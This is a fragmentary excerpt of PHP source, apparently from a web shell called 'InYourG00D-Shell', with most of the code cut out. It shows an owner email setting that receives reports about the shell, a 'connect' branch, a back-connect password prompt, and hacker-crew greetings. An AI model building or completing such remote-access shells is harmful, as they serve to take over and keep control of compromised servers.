...
$ownerEmail 		= "IYGD@gmail.com"; // Change this to your email , This email is used to deliver tracebacks about your shell
...
else if(isset($_GET['connect']))
{
    ...
    else if($_POST['mode'] == "PHP")
    {
        ...
        $passwordPrompt = "\n=================================================================\nInYourG00D-Shell | C0d3d by IYGD | IND\n=================================================================\n\n0xPassword : ";
...
(: <a href="http://twitter.com/lionaneesh">Follow Me</a> | <a href="http://facebook.com/Ndaa.nanda">Facebook</a> :) <br />
\m/ <b>Greetz to</b> : LNX#CREW , S.T.C , and all Cyber Team We'll Always rock \m/<br />
